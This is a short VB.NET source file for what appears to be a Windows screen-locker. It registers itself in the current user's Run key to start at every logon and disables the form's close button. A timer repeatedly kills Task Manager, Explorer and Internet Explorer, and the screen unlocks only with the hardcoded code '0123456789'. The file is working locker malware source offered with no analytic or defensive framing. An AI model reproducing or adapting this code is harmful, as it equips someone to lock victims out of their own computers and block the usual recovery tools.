Imports Microsoft.Win32
Imports System.Text.RegularExpressions

Public Class Form1

    Protected Overrides ReadOnly Property CreateParams As CreateParams
        Get
            Dim CurrentParams As CreateParams = MyBase.CreateParams
            Const CS_NOCLOSE As Integer = &H200
            CurrentParams.ClassStyle = CurrentParams.ClassStyle Or CS_NOCLOSE
            Return CurrentParams
        End Get
    End Property

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        Dim CurrentUser As Microsoft.Win32.RegistryKey = Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Run")
        With CurrentUser
            .OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run")
            .SetValue(Application.ProductName, Application.ExecutablePath)
        End With


        Me.Timer.Start()

    End Sub


    Private Sub Timer_Tick_1(sender As Object, e As EventArgs) Handles Timer.Tick
        Try
            Dim processBanned As Regex = New Regex("taskmgr|explorer|iexplore")

            For Each proc As Process In Process.GetProcesses
                If processBanned.IsMatch(proc.ProcessName()) Then
                    proc.Kill()
                End If
            Next
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If TextBox1.Text = "0123456789" Then
            Me.Dispose()
        End If
    End Sub
End Class
